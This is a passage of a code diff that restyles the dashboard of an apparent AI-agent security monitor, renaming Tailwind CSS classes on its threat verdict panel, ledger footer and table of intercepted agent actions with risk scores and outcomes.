+              <div className="p-4 rounded-well bg-well text-xs text-ink-2 leading-relaxed text-pretty">
                 {threatResult.verdict}
               </div>
             </div>
 
-            {/* Live Verification Footer (F10: measured, never overclaimed) */}
-            <div className="pt-4 border-t border-border flex items-center justify-between text-[11px] font-mono text-text-muted">
+            {/* Live Verification Footer */}
+            <div className="p-5 border-t border-line flex items-center justify-between text-[11px] font-mono text-ink-3">
               <span>SHA-256 Ledger</span>
-              <span className={threatResult.verifiedMatch ? 'text-accent-emerald font-semibold' : 'text-text-muted'}>
+              <span className={threatResult.verifiedMatch ? 'text-safe-ink font-semibold' : 'text-ink-3'}>
                 {threatResult.verifiedMatch ? 'Chain verified: Match confirmed' : 'Verification pending scan'}
               </span>
             </div>
@@ -751,10 +745,10 @@ export default function DashboardPage() {
         <section id="action-feed" className="space-y-4">
           <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
             <div>
-              <h3 className="text-lg font-heading font-bold text-text-primary">
+              <h3 className="text-lg font-display font-bold text-ink-1">
                 Live Intercepted Feed
               </h3>
-              <p className="text-xs text-text-secondary">
+              <p className="text-xs text-ink-2">
                 Chronological ledger of security decisions evaluated across system processes.
               </p>
             </div>
@@ -765,24 +759,24 @@ export default function DashboardPage() {
                 placeholder="Search actions..."
                 value={searchTerm}
                 onChange={(e) => setSearchTerm(e.target.value)}
-                className="px-3 py-1.5 rounded-xl bg-card border border-border text-xs text-text-primary font-mono focus:outline-none focus-visible:ring-2 focus-visible:ring-accent transition-all"
+                className="px-4 py-2 rounded-pill bg-well border border-line text-xs text-ink-1 font-mono focus:outline-none focus-visible:ring-2 focus-visible:ring-brand transition-all"
               />
 
               <button
                 onClick={handleExportLogs}
                 disabled={!daemonActions.length}
-                className="px-3 py-1.5 rounded-xl bg-card hover:bg-card-hover border border-border text-xs font-medium text-text-primary transition-colors disabled:opacity-50"
+                className="px-4 py-2 rounded-pill bg-surface hover:bg-well border border-line text-xs font-medium text-ink-1 transition-colors disabled:opacity-50 shadow-xs"
               >
                 Export CSV
               </button>
             </div>
           </div>
 
-          {/* Table Container */}
-          <div className="rounded-2xl bg-card border border-border shadow-xs overflow-hidden">
+          {/* Table Container (1px line border, 20px radius, shadow-card) */}
+          <div className="rounded-card bg-surface border border-line shadow-card overflow-hidden">
             <div className="overflow-x-auto">
               <table className="w-full text-left text-xs font-mono">
-                <thead className="bg-surface text-text-muted border-b border-border uppercase text-[10px]">
+                <thead className="bg-well text-ink-3 border-b border-line uppercase text-[10px]">
                   <tr>
                     <th className="py-3 px-4 font-semibold">Time</th>
                     <th className="py-3 px-4 font-semibold">Agent</th>
@@ -792,10 +786,10 @@ export default function DashboardPage() {
                     <th className="py-3 px-4 font-semibold text-right">Verdict</th>
                   </tr>
                 </thead>
-                <tbody className="divide-y divide-border-subtle">
+                <tbody className="divide-y divide-line">
                   {displayActions.length === 0 ? (
                     <tr>
-                      <td colSpan={6} className="py-12 text-center text-text-muted">
+                      <td colSpan={6} className="py-12 text-center text-ink-3">
                         {isOnline ? 'No recorded actions match current filters.' : 'Daemon offline. No actions to display.'}
                       </td>
                     </tr>
@@ -808,30 +802,30 @@ export default function DashboardPage() {
                         <tr
                           key={action.id}
                           onClick={() => setSelectedAction(action)}
-                          className="hover:bg-card-hover transition-colors cursor-pointer"
+                          className="hover:bg-well/60 transition-colors cursor-pointer"
                         >
-                          <td className="py-3 px-4 text-text-muted tabular-nums whitespace-nowrap">
+                          <td className="py-3 px-4 text-ink-3 tabular-nums whitespace-nowrap">
                             {formatLocalTime(action.created_at)}
                           </td>
-                          <td className="py-3 px-4 font-medium text-text-primary whitespace-nowrap">
+                          <td className="py-3 px-4 font-medium text-ink-1 whitespace-nowrap">
                             {action.agent_id || 'system'}
                           </td>
                           <td className="py-3 px-4 whitespace-nowrap">
-                            <span className="px-2 py-0.5 rounded-md bg-surface border border-border text-[10px] text-text-secondary">
+                            <span className="px-2.5 py-0.5 rounded-pill bg-well text-[10px] text-ink-2 font-mono">
                               {action.action_type}
                             </span>
                           </td>
-                          <td className="py-3 px-4 text-text-secondary max-w-xs truncate" title={action.target_path || undefined}>
+                          <td className="py-3 px-4 text-ink-2 max-w-xs truncate" title={action.target_path || undefined}>
                             {action.target_path || 'None'}
                           </td>
                           <td className="py-3 px-4 text-center tabular-nums font-semibold">
                             <span
-                              className={`px-2 py-0.5 rounded-full text-[10px] ${
+                              className={`px-2.5 py-0.5 rounded-pill text-[10px] font-mono ${
                                 action.risk_score >= 80
-                                  ? 'bg-accent-rose/15 text-accent-rose font-bold'
+                                  ? 'bg-critical-soft text-critical-ink font-bold'
                                   : action.risk_score >= 40
-                                  ? 'bg-accent-amber/15 text-accent-amber font-bold'
-                                  : 'bg-accent-emerald/15 text-accent-emerald'
+                                  ? 'bg-caution-soft text-caution-ink font-bold'
+                                  : 'bg-safe-soft text-safe-ink font-medium'
                               }`}
                             >
                               {action.risk_score}/100
@@ -839,12 +833,12 @@ export default function DashboardPage() {
                           </td>
                           <td className="py-3 px-4 text-right whitespace-nowrap font-bold">
                             <span
-                              className={`px-2 py-0.5 rounded-md text-[10px] ${
+                              className={`px-2.5 py-0.5 rounded-pill text-[10px] font-mono ${
                                 isBlock
-                                  ? 'bg-accent-rose/15 text-accent-rose border border-accent-rose/30'
+                                  ? 'bg-critical-soft text-critical-ink'
                                   : isPrompt
-                                  ? 'bg-accent-amber/15 text-accent-amber border border-accent-amber/30'
-                                  : 'bg-accent-emerald/15 text-accent-emerald border border-accent-emerald/30'
+                                  ? 'bg-caution-soft text-caution-ink'
+                                  : 'bg-safe-soft text-safe-ink'
                               }`}
                             >
                               {action.outcome}
